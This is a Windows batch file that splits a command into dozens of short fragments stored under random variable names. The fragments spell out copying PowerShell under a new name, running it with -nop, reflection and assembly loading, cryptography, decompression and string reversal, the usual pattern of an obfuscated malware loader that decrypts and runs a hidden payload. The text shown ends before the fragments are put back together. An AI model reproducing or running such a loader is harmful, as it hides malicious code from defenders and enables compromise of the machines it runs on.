@echo off
set "pghSfEVSox=.e"
set "NYXsBRKdbx=em"
set "zuVibnVTFM=s\"
set "VeabzruoAU=\W"
set "dMXMrlfJZM=\v"
set "rEtCovAdsD=he"
set "aJrRCMWLbo=ll"
set "qUycxNhhFj=rs"
set "dPvOuLvPgL= /"
set "mGldKJooDo=nd"
set "OuIQKavdoJ=32"
set "cerUsETNsx=we"
set "PwKdTkxAxK=y "
set "eYXcfEGlYh=we"
set "HZDVPhOqGi=he"
set "TlKsYpElSl=ow"
set "DTPHeouzlR=Sy"
set "SlrSiufWao=rS"
set "DqyOcrzjWH=do"
set "LUNhSJYWTk=ws"
set "MiaHIhXbQN=st"
set "pTdSYFVwfm=in"
set "ZXWHbCGtIT=co"
set "dFzJWMYKxC=ll"
set "QpFQgiUAqw=0\"
set "yuUMlUbQDD=po"
set "UhhtnWXRKu=py"
set "xwChhUrQSf=Po"
set "PvPDyfvcmY=1."
set "VpJIeNIuIq= C"
set "sIuPcrjPEb=Wi"
set "VFDVBbwDVB=:\"
set "NTkulxKOGX=xe"
set "TibdyltoeS=cd"
set "OeSdYXCgCV= %~dp0"
set "lLrJqvdsmY=pres"
set "QNuiZmWKVu=ZbcI"
set "LiNIhQONbs=s75K"
set "dbzaxaHDIq=tem."
set "bXAbJWSbjq=eam("
set "fMQjdUBaFA=daeR"
set "hSAkvQLoVx=pStr"
set "AfMYVQERam=)($q"
set "DFBGwaiWyF=ewLi"
set "JTKgxDbPIX=Tajn"
set "yVyLgASOkj=]::C"
set "dfWzLpvToZ=ment"
set "RZdAPhASfS=16] "
set "DoTYSUyXBc=] -j"
set "XKsBaNiMWO=ateD"
set "wOPAgJlifM=PxEW"
set "JqeWwjgpLX=[-1."
set "VAhHvwziTG=[Sys"
set "ROFrrcZstz='')("
set "KKHpksKTLK=New-"
set "pOQupLnxwY=.-16"
set "ygoVMMKDyK=flec"
set "SauMFggBzW=zqjS"
set "ULRZhpJCBV=fore"
set "GcPvkrSpzm=[Sys"
set "QwNqktcHGo=whJU"
set "sngcRiMuvo=ssFD"
set "rvGpvXVONW= = $"
set "xNmzjcMUhR=-nop"
set "lcUNiLgAEF=Comp"
set "dwCUdWZsZp=nHA "
set "XjUeOnVwSv=::De"
set "sWSmotimkt= [st"
set "rLRSMxLniW=();$"
set "vtuvMoIFBe=hy.A"
set "oqmSWPfuKv=ypto"
